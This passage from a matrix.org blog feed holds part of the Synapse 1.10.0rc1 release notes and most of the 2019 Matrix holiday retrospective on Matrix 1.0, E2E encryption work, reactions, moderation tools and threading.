&lt;h1 id=&quot;synapse-1-10-0rc1-2020-01-31&quot;&gt;Synapse 1.10.0rc1 (2020-01-31)&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;features-1&quot;&gt;Features&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Add experimental support for updated authorization rules for aliases events, from &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2260&quot;&gt;MSC2260&lt;&#x2F;a&gt;. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6787&quot;&gt;#6787&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6790&quot;&gt;#6790&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6794&quot;&gt;#6794&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;bugfixes-2&quot;&gt;Bugfixes&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Warn if postgres database has a non-C locale, as that can cause issues when upgrading locales (e.g. due to upgrading OS). (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6734&quot;&gt;#6734&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Minor fixes to &lt;code&gt;PUT &#x2F;_synapse&#x2F;admin&#x2F;v2&#x2F;users&lt;&#x2F;code&gt; admin api. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6761&quot;&gt;#6761&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Validate &lt;code&gt;client_secret&lt;&#x2F;code&gt; parameter using the regex provided by the Client-Server API, temporarily allowing &lt;code&gt;:&lt;&#x2F;code&gt; characters for older clients. The &lt;code&gt;:&lt;&#x2F;code&gt; character will be removed in a future release. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6767&quot;&gt;#6767&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix persisting redaction events that have been redacted (or otherwise don&#x27;t have a redacts key). (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6771&quot;&gt;#6771&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix outbound federation request metrics. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6795&quot;&gt;#6795&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix bug where querying a remote user&#x27;s device keys that weren&#x27;t cached resulted in only returning a single device. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6796&quot;&gt;#6796&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix race in federation sender worker that delayed sending of device updates. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6799&quot;&gt;#6799&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6800&quot;&gt;#6800&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix bug where Synapse didn&#x27;t invalidate cache of remote users&#x27; devices when Synapse left a room. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6801&quot;&gt;#6801&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix waking up other workers when remote server is detected to have come back online. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6811&quot;&gt;#6811&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;improved-documentation&quot;&gt;Improved Documentation&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Clarify documentation related to &lt;code&gt;user_dir&lt;&#x2F;code&gt; and &lt;code&gt;federation_reader&lt;&#x2F;code&gt; workers. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6775&quot;&gt;#6775&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;internal-changes-2&quot;&gt;Internal Changes&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Record room versions in the &lt;code&gt;rooms&lt;&#x2F;code&gt; table. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6729&quot;&gt;#6729&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6788&quot;&gt;#6788&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6810&quot;&gt;#6810&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Propagate cache invalidates from workers to other workers. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6748&quot;&gt;#6748&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Remove some unnecessary admin handler abstraction methods. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6751&quot;&gt;#6751&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Add some debugging for media storage providers. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6757&quot;&gt;#6757&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Detect unknown remote devices and mark cache as stale. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6776&quot;&gt;#6776&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6819&quot;&gt;#6819&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Attempt to resync remote users&#x27; devices when detected as stale. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6786&quot;&gt;#6786&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Delete current state from the database when server leaves a room. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6792&quot;&gt;#6792&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;When a client asks for a remote user&#x27;s device keys check if the local cache for that user has been marked as potentially stale. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6797&quot;&gt;#6797&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Add background update to clean out left rooms from current state. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6802&quot;&gt;#6802&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6816&quot;&gt;#6816&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Refactoring work in preparation for changing the event redaction algorithm. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6803&quot;&gt;#6803&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6805&quot;&gt;#6805&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6806&quot;&gt;#6806&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6807&quot;&gt;#6807&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6820&quot;&gt;#6820&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>The 2019 Matrix Holiday Update!</title>
        <published>2019-12-24T00:00:00+00:00</published>
        <updated>2019-12-24T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2019/12/24/the-2019-matrix-holiday-update/" type="text/html"/>
        <id>https://matrix.org/blog/2019/12/24/the-2019-matrix-holiday-update/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;Every year we do an annual wrap-up and retrospective of all the things happening in the Matrix core team - if you’re feeling particularly curious or bored you can check out the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2015&#x2F;12&#x2F;25&#x2F;the-matrix-holiday-special&#x2F;&quot;&gt;2015&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2016&#x2F;12&#x2F;26&#x2F;the-matrix-holiday-special-2016-edition&#x2F;&quot;&gt;2016&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2017&#x2F;12&#x2F;25&#x2F;the-matrix-holiday-mini-special-2017-edition&#x2F;&quot;&gt;2017&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2018&#x2F;12&#x2F;25&#x2F;the-2018-matrix-holiday-special&#x2F;&quot;&gt;2018&lt;&#x2F;a&gt; editions for context.  The idea is to look at the bigger picture trends in Matrix outside of the weekly &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;category&#x2F;this-week-in-matrix&#x2F;&quot;&gt;TWIM&lt;&#x2F;a&gt; posts to get an idea of the stuff which we made progress on, and the stuff which still remains.&lt;&#x2F;p&gt;
&lt;p&gt;That said, it’s hard to know where to start - Matrix accelerated more than ever before in 2019, and there’s been progress on pretty much all battlefronts.  So as a different format, let’s take the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2018&#x2F;12&#x2F;25&#x2F;the-2018-matrix-holiday-special#2019&quot;&gt;stuff we said we had planned for 2019&lt;&#x2F;a&gt; from the end of last year’s update and see what we actually achieved...&lt;&#x2F;p&gt;
&lt;h4 id=&quot;2019-the-immediate-priorities&quot;&gt;2019: the immediate priorities&lt;&#x2F;h4&gt;
&lt;p&gt;So, our immediate priorities for 2019 were:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;r0 spec releases across the board (aka Matrix 1.0)&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;em&gt;Implementing them in Synapse&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;✅ Well, unless you’ve been floating in a sensory deprivation tank for the last year, hopefully you spotted that Matrix (as a protocol) finally exited beta - starting off with the announcement at FOSDEM in February of the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;02&#x2F;04&#x2F;matrix-at-fosdem-2019&#x2F;&quot;&gt;first stable release of the Server-Server API&lt;&#x2F;a&gt;, alongside the Synapse 0.99.x series as we began the process of migrating to the 1.0 APIs.&lt;&#x2F;p&gt;
&lt;p&gt;Specifically this meant killing off self-signed certificates, adding .well-known server discovery and implementing room version semantics so we could upgrade the underlying room version algorithm to fix the residual flaws.  This culminated in June with the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;06&#x2F;11&#x2F;introducing-matrix-1-0-and-the-matrix-org-foundation&#x2F;&quot;&gt;official release of Matrix 1.0&lt;&#x2F;a&gt; - now including the remaining APIs and a stable release of Synapse 1.0.  The emphasis was on addressing all the main pre-1.0 design flaws rather than adding features or performance, but with 1.0 out the door at last we’ve been able to make progress there too.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Landing the Riot redesign&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;✅ The full redesign of Riot’s UI on Web&#x2F;Desktop landed shortly after FOSDEM in Feb with &lt;a href=&quot;https:&#x2F;&#x2F;medium.com&#x2F;@RiotChat&#x2F;the-big-1-0-68fa7c6050be&quot;&gt;The Big 1.0&lt;&#x2F;a&gt;. Cosmetically we got most of the new look &amp;amp; feel in place, and have had very positive feedback overall - although some of the UX thinkos of the old app remain and coming up on the radar for fixing.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Finalising the Matrix.org Foundation&lt;&#x2F;em&gt; &lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;✅ This happened too, coincident with releasing Matrix 1.0 in June - read all about it at &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;foundation&quot;&gt;https:&#x2F;&#x2F;matrix.org&#x2F;foundation&lt;&#x2F;a&gt;. So far the governance and legal infrastructure the Foundation provides has helped the project significantly, and while it was a mammoth task to organise, we’re very glad it’s here!  Huge thanks go out to Jon, Ross and Jutta for agreeing to join the foundation as Guardians - they have been excellent in patiently listening to the various dramas of the year and ensuring Matrix’s neutrality and that we keep an even keel.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Landing all the new E2E encryption UX and features&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;The good news on E2E encryption is that we’ve been making solid progress throughout the year - the bad news is that we are still yet to turn it on by default.  Progress updates for the various pieces of the puzzle are as follows:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;✅ The final UX is pretty much locked down (after several iterations as we try to tread the balance between trustworthiness and security) - here’s a &lt;a href=&quot;https:&#x2F;&#x2F;www.figma.com&#x2F;file&#x2F;wwqBo5oAFfk8XKmtd2YaIs&#x2F;Cross-signing&quot;&gt;sneak preview&lt;&#x2F;a&gt; of what we’re aiming at.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;🏗 Cross-signing is the single biggest remaining piece of work in progress - letting users attest to the trustworthiness of their own devices, so you only ever have to trust a given user once rather than trusting all their devices individually. We gave a &lt;a href=&quot;https:&#x2F;&#x2F;youtu.be&#x2F;C2eE7rCUKlE?t=2974&quot;&gt;very early demo&lt;&#x2F;a&gt; of an experimental implementation back at FOSDEM in Feb, inspired by some of the initial spec proposal at &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;uhoreg&#x2F;matrix-doc&#x2F;blob&#x2F;cross-signing&#x2F;proposals&#x2F;1680-cross-signing.md&quot;&gt;MSC1680&lt;&#x2F;a&gt; (MSC = Matrix Spec Change, our &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;spec&#x2F;proposals&quot;&gt;process for evolving Matrix&lt;&#x2F;a&gt;).&lt;&#x2F;p&gt;
&lt;p&gt;However, having played with it a bit, MSC1680 turned out to be too generic and complicated (it worked by the user signing a device with any other of their devices, building a twisted maze of which device vouched for which) - and we replaced it with &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;1756&quot;&gt;MSC1756&lt;&#x2F;a&gt;, which shifts the model to be the simpler “the user has a key, which they use to sign their devices”. However, this in turn requires more infrastructure - you need somewhere secure to store your signing key, which prompted &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;uhoreg&#x2F;matrix-doc&#x2F;blob&#x2F;ssss&#x2F;proposals&#x2F;1946-secure_server-side_storage.md&quot;&gt;MSC1946&lt;&#x2F;a&gt; - Secure Secret Storage &amp;amp; Sharing (SSSS): the ability to sync your signing key between devices by storing it (encrypted, of course) on the server.&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile, it also became obvious that the primitives for key verification needed to be improved too: introducing verification by emoji comparison (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;issues&#x2F;1267&quot;&gt;MSC1267&lt;&#x2F;a&gt;) and QR codes (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;issues&#x2F;1543&quot;&gt;MSC1543&lt;&#x2F;a&gt;), and switching key verification to be performed in the context of a DM (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2241&quot;&gt;MSC2241&lt;&#x2F;a&gt;) so that you can see your verification history, find verifications, and easily dip in and out of verifying users as needed.&lt;&#x2F;p&gt;
&lt;p&gt;Whilst everyone else was panicking about Matrix 1.0 and associated baggage, Uhoreg was off in the wilderness plugging his way through all of this - iterating on the design, speccing it and implementing it in synapse and matrix-js-sdk, complete with a test jig to demonstrate it all working (&lt;a href=&quot;https:&#x2F;&#x2F;scitech.video&#x2F;videos&#x2F;watch&#x2F;1c8a0262-dee9-4927-b9e9-9856a7f4d8bf&quot;&gt;part 1&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;scitech.video&#x2F;videos&#x2F;watch&#x2F;d1ef04a8-397a-4570-a9a9-cef143ea637c&quot;&gt;part 2&lt;&#x2F;a&gt;).  Over the last few months the rest of the team has joined him though, and we’ve been frantically working away implementing it all on both Riot&#x2F;Web, iOS &amp;amp; RiotX&#x2F;Android.  For instance - here’s &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;_matrix&#x2F;media&#x2F;r0&#x2F;download&#x2F;matrix.org&#x2F;IoFfFRWTmRNTbNDzfmKFPvLq&quot;&gt;verification happening in DM&lt;&#x2F;a&gt; between Riot&#x2F;Web &amp;amp; RiotX a few weeks ago, and here’s a very early (unskinned) cut of &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;_matrix&#x2F;media&#x2F;r0&#x2F;download&#x2F;matrix.org&#x2F;tAWxQKhrfiPxBvtAOQfMiGjW&quot;&gt;verification&lt;&#x2F;a&gt; happening in Riot&#x2F;Web’s RightPanel a few days ago.&lt;&#x2F;p&gt;
&lt;p&gt;We were hoping to get cross-signing ready for the end of 2019, but in practice we’re now sprinting to get it done by FOSDEM 2020 in Feb - not least because we have a main-stage talk proposed to tell everyone how we landed it and turned on E2E by default... ;)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;✅ Support for non-E2E clients.  The last thing we want is to make it impossible to write a simple Matrix client, or to suddenly excommunicate (hah) all the existing Matrix bots &amp;amp; bridges which haven’t implemented E2E.  To this end, poljar created &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;pantalaimon&quot;&gt;pantalaimon&lt;&#x2F;a&gt; - our very own Matrix daemon, which can sit in the background and offload all your E2EE from your Matrix client by acting as a transparent Matrix proxy which magically encrypts everything.  Built on matrix-nio and asyncio python3, We use it in production today for running various bots and it works excellently.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;✅ Support for search in E2E rooms.  Hot off the heels of pantalaimon’s success, poljar also created &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;seshat&quot;&gt;seshat&lt;&#x2F;a&gt; - a native library for clientside indexing encrypted Matrix events written in Rust, powered by the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;tantivy-search&#x2F;tantivy&quot;&gt;tantivy&lt;&#x2F;a&gt; full-text search engine.  (pantalaimon also has support for indexing via tantivy, which involved contributing python bindings for tantivy, but we ended up going with Rust so we could embed it natively in as many Matrix clients as possible).  Seshat is particularly cool in that the indexes themselves are encrypted in on disk - and in future could even be synced between clients using &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;uhoreg&#x2F;matrix-doc&#x2F;blob&#x2F;ssss&#x2F;proposals&#x2F;1946-secure_server-side_storage.md&quot;&gt;SSSS&lt;&#x2F;a&gt; so you don’t have to reindex your messages every time you log in on a new device.  Seshat is implemented behind a labs flag on Riot&#x2F;Desktop and it will ship as soon Riot&#x2F;Desktop’s build pipeline is fully updated to support native modules (which will also unlock other goodies, such as using faster&#x2F;safer native E2E primitives, safer key storage, and Discord-style keyboard-shortcuts for VoIP).&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;🏗 Fixing “unable to decrypt” errors.  We’ve done big sprint over the last month or so to track down the final straggling causes of unable to decrypt errors.  Some of these are legitimate bugs (e.g. &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6399&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6399&lt;&#x2F;a&gt;) - but many are artefacts of the current architecture: for instance, if the sender has no way to know your device was in the room when it encrypted a message, you won’t be able to decrypt.  We’re addressing this by improving better error messages and feedback so the user isn’t surprised by what’s going on (aiming for Jan) - and in future we’ll have to revisit E2E’s fundamentals to ensure that it’s impossible to receive a message without also receiving the key to decrypt it.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;✅ Support for push notifications in E2E rooms.  This is kinda solved right now by having all clients get (silently) pushed whenever they receive a message in an E2E room with push enabled, and relying on the client to be woken up by the push in order to decrypt the message in order to display the push notification.  However, this is battery intensive, and we could probably do better - but this isn’t a blocker for going live.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;🏗 Support for FilePanel and NotifPanel in E2E rooms.  Seshat should fix this by indexing all your messages (and so tracking whether they contain pushes or files, and populating up your local view of your file &amp;amp; notif panels respectively) - just need to ensure it’s hooked up.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;...and that’s where things stand right now on E2E by default.  We’ll start turning it on by default for private rooms as soon as the UX has landed (probably starting first with new DMs and private rooms, prompting the user in case they want to opt out - and then migrating existing ones).  It’s worth noting that we have poured a &lt;em&gt;lot&lt;&#x2F;em&gt; of work into E2E encryption now - often to the detriment of the rest of Matrix; our rich featureset and decentralisation has combined to make this a tough nut to crack, but the end is in sight.  Thanks to all for your patience and support while we’ve been working through this.&lt;&#x2F;p&gt;
&lt;p&gt;That takes us to the end of the stuff we planned to prioritise in 2019 - but what about the more speculative medium-term stuff which was on the menu this time last year?&lt;&#x2F;p&gt;
&lt;h4 id=&quot;2019-the-medium-term-priorities&quot;&gt;2019: the medium-term priorities&lt;&#x2F;h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Reworking and improving Communities&#x2F;Groups.&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;We have some really promising UX work and a fairly early spec proposal (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;matthew&#x2F;msc1772&#x2F;proposals&#x2F;1772-groups-as-rooms.md&quot;&gt;MSC1772&lt;&#x2F;a&gt;), but work in earnest hasn’t kicked off yet. It’s going to be one of the next big projects though. &lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Reactions.&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;✅ Riot now has Reactions! 🎉🎉🎉  The only remaining work is to finish the remaining rough edges of the spec proposal (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;matthew&#x2F;msc1849&#x2F;proposals&#x2F;1849-aggregations.md&quot;&gt;MSC1849&lt;&#x2F;a&gt;) and actually land them in the Matrix spec proper.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;E2E-encrypted Search&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;✅ &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;seshat&quot;&gt;Seshat&lt;&#x2F;a&gt; exists! (see above)&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Filtering. (empowering users to filter out rooms &amp;amp; content they&#x27;re not interested in).&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;✅ We’ve ended up thinking lots in 2019 about empowering users to filter content.  The main impetus has been to ensure that users and communities can filter out abuse (on their own terms), and also to start building infrastructure which can be used for folks to share their own filters.  Over the last few months, this has started to take concrete form - with the arrival of &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;msc2313&#x2F;proposals&#x2F;2313-moderation-policy-rooms.md&quot;&gt;MSC2313&lt;&#x2F;a&gt; “Moderation policies as rooms”, and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;mjolnir&quot;&gt;Mjolnir&lt;&#x2F;a&gt; - a bot you can run to enforce moderation policies on your rooms.  It’s all quite early, but we expect a lot more work in this space over the coming year (and it’s wryly amusing that &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;jack&#x2F;status&#x2F;1204766078468911106&quot;&gt;Twitter has also woken up&lt;&#x2F;a&gt; to it being an interesting problem needing to be solved.)&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Extensible events&lt;&#x2F;em&gt; &lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Sorry folks; no progress here since a flurry of spec work (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;matthew&#x2F;msc1767&#x2F;proposals&#x2F;1767-extensible-events.md&quot;&gt;MSC1767&lt;&#x2F;a&gt;) back in Jan 2019. The good news is that the spec proposal seems to be relatively well received. The bad news is that we haven’t had bandwidth to finish reviewing it, implementing it and migrating it anywhere. It blocks a bunch of really useful stuff in Matrix, and there are users willing to pay for it (via New Vector) - we’ll get to it as soon as we can.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Editable messages.&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;✅ These landed too and are a thing of joy!  Just need to merge &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;matthew&#x2F;msc1849&#x2F;proposals&#x2F;1849-aggregations.md&quot;&gt;MSC1849&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Extensible Profiles (we&#x27;ve actually been experimenting with this already).&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Similar to Extensible Events, there was a flurry of spec work (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;matthew&#x2F;msc1769&#x2F;proposals&#x2F;1769-extensible-profiles-as-rooms.md&quot;&gt;MSC1769&lt;&#x2F;a&gt;) back in Jan, but little progress since.  This will also unlock a lot of really useful features - e.g. custom status, custom profile data, social timeline rooms etc.  We’ll likely get to it shortly after communities work.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Threading.&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;🏗 So we actually landed label-based threading (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;matthew&#x2F;msc2326&#x2F;proposals&#x2F;2326-label-based-filtering.md&quot;&gt;MSC2326&lt;&#x2F;a&gt;) in Synapse 1.6, but it’s not exposed in Riot yet (or elsewhere).  It doesn’t have quite the same semantics as Slack-style threading; the idea is to filter down your room based on which messages are tagged as part of a given topic.  However, it’s very powerful, and it’ll be fun to add it to Riot at some point in 2020.  Meanwhile, better-than-label-based-threading is also on the cards, although slightly lower priority than some of the other stuff in this section.&lt;&#x2F;p&gt;
&lt;ul&gt;
